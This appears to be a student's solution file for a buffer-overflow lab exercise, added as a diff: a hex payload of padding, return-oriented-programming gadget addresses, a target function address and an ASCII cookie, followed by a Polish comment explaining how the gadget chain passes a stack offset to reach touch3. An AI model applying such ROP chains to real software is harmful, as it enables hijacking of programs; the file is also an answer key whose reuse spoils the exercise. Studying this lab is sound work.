@@ -1,0 +1,25 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+3e 1e 40 00 00 00 00 00
+99 1d 40 00 00 00 00 00
+a2 1d 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+e0 1d 40 00 00 00 00 00
+d9 1d 40 00 00 00 00 00
+11 1e 40 00 00 00 00 00
+d3 1d 40 00 00 00 00 00
+99 1d 40 00 00 00 00 00
+04 1d 40 00 00 00 00 00
+37 38 30 30 32 64 61 37
+
+/* Najpierw jest zapełnenie  bufora (40 bajtów). Ostatnia linijka to zapis ciasteczka w ascii. Sytuacja podobna jak wcześniej. Procedury <hexmatch> and <strncmp> wołane z wnętrza <touch3> używają stosu,
+zatem nadpisują pamięć przydzieloną poprzednio buforowi z funkcji <getbuf>, dlatego ciastko jest w ostatniej linijce, za adresem touch3. Pierwsze dwie linijki pod paddingiem zapisują aktualną wartosc rsp do rdi (ponieważ od tego adresu bedzie liczony offset do ciastka).
+W swojej hodowli gadżetów nie znalazłem kodowania movq %rsp, %rdi, więc użyłem 2 gadżetów, przechodząc przez rax. Następnie zapamiętuję offset w rax. 
+Wartość stosu musi być w %rdi, ponieważ aby dostać się do ciastka na stosie, używam funkcji z hodowli gadżetów "add_xy", która działa tak: "lea (%rdi,%rsi,1),%rax". Zatem w %rsi będzie offset przesłany z %rax.
+Niestaty nie znalazłem żadnego gadżetu pozwalającego na "movq %rax, %rsi", więc musiałem posłużyć się operacjami na 32 bitach, gdzie też nie było prostej drogi, tylko musiałem przesłąc wartość przez %eax -> %edx -> %ecx -> %esi. Potem jużtylko przenoszę %rax do %rdi i wywołuję touch3.
+Użyte gadżety:
+setval_359, addval_107, getval_389, setval_214, getval_458, addval_210, add_xy.
+*/
